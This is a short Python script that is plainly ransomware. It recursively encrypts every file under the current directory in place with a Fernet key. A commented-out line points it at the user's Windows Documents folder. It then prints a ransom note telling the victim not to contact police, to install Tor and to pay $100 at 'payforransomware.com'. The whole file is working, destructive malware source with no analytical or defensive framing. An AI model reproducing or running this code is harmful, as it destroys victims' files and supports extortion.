import os, sys
from cryptography.fernet import Fernet
import getpass

def code(f):
    with open(f, 'rb') as file:
        txt = fnt.encrypt(file.read())
    with open(f, 'wb') as file:
        file.write(txt)

def dirs(d):
    for f in os.listdir():
        print(os.getcwd())
        fs = f.split('.')
        if len(fs)==1:
            os.chdir(fs[0])
            dirs(fs[0])
            os.chdir('../')
        else:
            try:
                code(f)
            except:
                pass

#os.chdir('C:\\Users\\'+getpass.getuser()+'\\Documents')
key = Fernet.generate_key()
fnt = Fernet(key)
print('Working...')
dirs('./')
print('Done. If you want to get files back, do following steps:\n\
       1. Don\'t call the police\n\
       2. Don\'t try to decrypt files\n\
       2. Install TOR browser\n\
       3. Go to payforransomware.com\n\
       4. Pay 100$\n\
       5. Wait one or two days\n\
       6. Your files will be decrypted')

with open('key.txt', 'wb') as f:
    f.write(key)
